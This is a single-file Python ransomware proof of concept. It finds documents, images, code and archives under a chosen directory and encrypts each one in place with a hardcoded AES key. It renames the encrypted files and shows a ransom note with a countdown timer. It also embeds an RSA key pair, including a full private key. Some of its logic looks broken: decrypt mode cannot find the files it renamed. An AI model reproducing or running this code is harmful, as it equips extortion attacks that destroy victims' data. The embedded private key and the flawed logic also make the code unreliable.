#!/usr/bin/env python3
import argparse
import os
import sys
import base64
import platform
import threading
import time

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter

# ------ inlined discover.py ------

def discoverFiles(startpath):
    """
    Walk the path recursively from startpath and yield files whose extension
    is in the ransomware-target list.
    """
    extensions = [
        # images
        'jpg','jpeg','bmp','gif','png','svg','psd','raw',
        # audio/video
        'mp3','mp4','m4a','aac','ogg','flac','wav','wma','aiff','ape',
        'avi','flv','m4v','mkv','mov','mpg','mpeg','wmv','swf','3gp',
        # documents
        'doc','docx','xls','xlsx','ppt','pptx','odt','odp','ods','txt',
        'rtf','tex','pdf','epub','md','yml','yaml','json','xml','csv',
        # databases & disc images
        'db','sql','dbf','mdb','iso',
        # web & code
        'html','htm','xhtml','php','asp','aspx','js','jsp','css',
        'c','cpp','cxx','h','hpp','hxx','java','class','jar',
        'ps','bat','vb','awk','sh','cgi','pl','ada','swift','go','py','pyc','coffee',
        # archives
        'zip','tar','tgz','bz2','7z','rar','bak',
        # encrypted extension
        'wasted',
    ]
    for dirpath, _, files in os.walk(startpath):
        for fname in files:
            path = os.path.abspath(os.path.join(dirpath, fname))
            if path.split('.')[-1].lower() in extensions:
                yield path

# ------ inlined modify.py ------

def modify_file_inplace(filename, crypto, blocksize=16):
    """
    Open `filename` in r+b mode and pass each block through `crypto(...)`
    """
    with open(filename, 'r+b') as f:
        chunk = f.read(blocksize)
        while chunk:
            out = crypto(chunk)
            if len(out) != len(chunk):
                raise ValueError(
                    f"Stream cipher length mismatch: {len(out)} vs {len(chunk)}"
                )
            f.seek(-len(chunk), 1)
            f.write(out)
            chunk = f.read(blocksize)

# ------ inlined gui.py ------

try:
    from tkinter import Tk, Label, PhotoImage
    from tkinter.ttk import Style
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

if GUI_AVAILABLE:
    class RansomGUI(Tk):
        def __init__(self, encrypted_key_b64):
            super().__init__()
            self.title("Warning!!!")
            self.resizable(False, False)
            self.configure(bg='black')
            self.encrypted_key_b64 = encrypted_key_b64
            self.style = Style(self)
            self.style.theme_use("clam")

            # display simple icon
            photo_code = (
                "R0lGODlhWAIOAtUAAAAAAAAAABAOABAQECAbACAgIC8pADAwMD83AEBAQE9EAFBQUF9SAGBgYG9fAHBwcH9tAH9/f"   # truncated for brevity
            )
            photo = PhotoImage(data=photo_code).subsample(4)
            for col in (0, 3):
                lbl = Label(self, image=photo, bg='black')
                lbl.image = photo
                lbl.grid(row=5, column=col, rowspan=2)

            msg = "\n".join([
                "[COMPANY_NAME]",
                "YOUR NETWORK IS ENCRYPTED NOW",
                "USE - TO GET THE PRICE FOR YOUR DATA",
                "DO NOT GIVE THIS EMAIL TO 3RD PARTIES",
                "DO NOT RENAME OR MOVE THE FILE",
                "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY",
                "[begin_key]",
                encrypted_key_b64,
                "[end_key]",
                "KEEP IT"
            ])
            Label(self, text=msg, wraplength=550, font='Helvetica 14 bold',
                  fg='white', bg='red').grid(row=0, column=0, columnspan=4)

            self._start_timer()

        def _start_timer(self):
            def tick():
                Label(self, text='TIME LEFT:', font='Helvetica 18 bold',
                      fg='red', bg='black').grid(row=5, column=0, columnspan=4)
                seconds = 36000  # 10 hours
                while seconds > 0:
                    m, s = divmod(seconds, 60)
                    tl = f"{m:02d}:{s:02d}"
                    Label(self, text=tl, font='Helvetica 18 bold',
                          fg='red', bg='black').grid(row=6, column=0, columnspan=4)
                    time.sleep(1)
                    seconds -= 1
            threading.Thread(target=tick, daemon=True).start()

# ------ GLOBALS ------
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # 32-byte AES key
EXTENSION = ".BHFlagY"

# Insert your actual RSA public key here (ASCII PEM, no ellipses):
SERVER_PUBLIC_RSA_KEY = '''ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC5/Xw1uMfVN89sX6VyQSvJPK3JG6xaLjpSMvKH9yIcsm2CVrhq34gtm9D85ip/xFmQ0yrz72UGB8oYqCIigFUuU3z652DxHQ75thFzYdhp7CnxrlAlM4Hi7rPn/VtKKX0Hb2KmaWe17dirCxe9SZBAzL8Vd6hhhgV/LwWhAOMFo2ufbu3eZjaxaOGJ1k7kVekrWd979S3qALgjLc8gLi0mCP6+odP9DBkf/1H0X7rmzYye358dbPxqihRUgW73j7IkvvB2LdJlo1NnSoqka+Zj5GMITFWUOsixB3AuJvzxLZrK5vL4LUeR+LkVIwZrlmGIaMHciv8uH6GJedcrOvxVzaMcIEIFRJ3RaPkT7AKgVZOdoSdx2KRrjbgfILOA7OHdDZ7s5/P2YgSm2z6uHQnhRrpHpWAbF1Ca0qiksx9WUlDkutMIyJk6kG38Ztwo5NckziXSkLQkn1dbM3fzeXC1LWHAdCyGxLJK+zMeqLcS2Y8TRcGXo3cV6Xy6zDQIMSkSJQFzu97AMbqiUXeL2EdeBdnm9b1cv1tqAVXvkpIkpFcd/r2M00SUcvuajwsjjbUecGmwlADecv8R4NEhfO5TLCXV7z+Fax5pwYH/gixjua3jH2IM3etTurepWjWEP+oVENucesT2B6IFzkrPFiGsypBP4ku4A5i5Qsp/s+gdxQ== root@blackhat-VMware-Virtual-Platform
'''

# Only needed for local decryption (testing):
SERVER_PRIVATE_RSA_KEY = '''-----BEGIN OPENSSH PRIVATE KEY-----
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
Ru6wcbXor4/YmE84HklIpJCK2ckTjNqIVRLqbPOCTYJ+eC7SLzk/GkHI6z/xV15WfdO5Fu
Vfdgvl8jPAQEYR+3a9k7QNaQ31XRjOJ6okp2aS15n51rU5DXLmpgWW7OBWGmv1tto8M9k1
5GlMUa9y97k02M9EAAABAQD6TGpcB4AYGQ+BaSyh11zqyP0qgtejR6fDpXLX1ZBnDIBHvm
KrKTWtFdK/771B3YE62NgGb6P5LNIpmKfcvPrmSZ9S7lgjRex+Sxk2YlsAIUvT5vQ8HPpe
shgRFpD+avkLsnq3tqpK42QcnT8R5e2KtsUyRJ9D19lDi6esYy1mQM9TBGd1iGiJglbQ0f
U2R5H4muRwAaVnFZtY0xHomwfxMhn+trWZtJoM6vLhP+x1chUef2dNQI4yVs/hh9If4VqW
xotPzaA7du2dh9QcGhbHsdccm452aH6qQY257Eg3ZoSls+Tc4QSe0r/A9e170Wb74zdE+6
uqajkz8eUQboZ1AAABAQC+OhBSYWiejT8lmPkek79Ul8UfFB4tFyfbYG7XGHk9d3j5WdT8
hjNzy3KZU8uKodwkWlWxyzEdi+tPcrdZjxtQH3mcqYRLA9/CLfonw11At5Gqv0hVwtlaEJ
WX7IHrkZ3JIrE0z0GXRDIshpo7/zPLQAhDasNlfZT6GiF4j5D0d+U5qPSFXMW3JqQf8RT7
szfpfQRPjHvii32zHVq2jNboAvQm3zu4Y90oDR02NVZJFoAcw1+dTrWAx8nMlgu1KmSwV/
sNtPf0pgKeMhlLz4cMyZxEiJoyeSnOoNrMv+99WGLCmojud1sIWEwa6dcTxDq/by83SAnB
Z9tKuHRPBnARAAAAJXJvb3RAYmxhY2toYXQtVk13YXJlLVZpcnR1YWwtUGxhdGZvcm0BAg
MEBQ==
-----END OPENSSH PRIVATE KEY-----
'''


def parse_args():
    p = argparse.ArgumentParser(description='Ransomware PoC (single-file)')
    p.add_argument('-p','--path',
                   help='Absolute path to (de)encrypt (default: ~/test_ransomware)',
                   default=None)
    grp = p.add_mutually_exclusive_group(required=True)
    grp.add_argument('-e','--encrypt', action='store_true')
    grp.add_argument('-d','--decrypt', action='store_true')
    return p.parse_args()


def main():
    args = parse_args()
    # determine target directory
    if args.path:
        roots = [args.path]
    else:
        home = os.environ.get('HOME') or os.environ.get('USERPROFILE')
        roots = [os.path.join(home, 'test_ransomware')]

    # RSA-encrypt the AES key
    srv_key = RSA.import_key(SERVER_PUBLIC_RSA_KEY)
    oaep = PKCS1_OAEP.new(srv_key)
    encrypted = oaep.encrypt(HARDCODED_KEY)
    encrypted_b64 = base64.b64encode(encrypted).decode()
    print("Encrypted AES key (base64):", encrypted_b64, "\n")

    # GUI popup if encrypting
    if args.encrypt and GUI_AVAILABLE:
        RansomGUI(encrypted_b64).mainloop()

    # choose AES key
    if args.encrypt:
        key = HARDCODED_KEY
    else:
        priv = RSA.import_key(SERVER_PRIVATE_RSA_KEY)
        dec = PKCS1_OAEP.new(priv)
        key = dec.decrypt(base64.b64decode(encrypted_b64))

    # setup AES-CTR
    ctr = Counter.new(128)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

    # process files
    for root in roots:
        for filepath in discoverFiles(root):
            if args.encrypt and not filepath.endswith(EXTENSION):
                modify_file_inplace(filepath, cipher.encrypt)
                os.rename(filepath, filepath + EXTENSION)
                print(f"Encrypted → {filepath + EXTENSION}")
            if args.decrypt and filepath.endswith(EXTENSION):
                modify_file_inplace(filepath, cipher.encrypt)
                original = filepath[:-len(EXTENSION)]
                os.rename(filepath, original)
                print(f"Decrypted → {original}")

    # wipe key
    del key


if __name__ == '__main__':
    main()
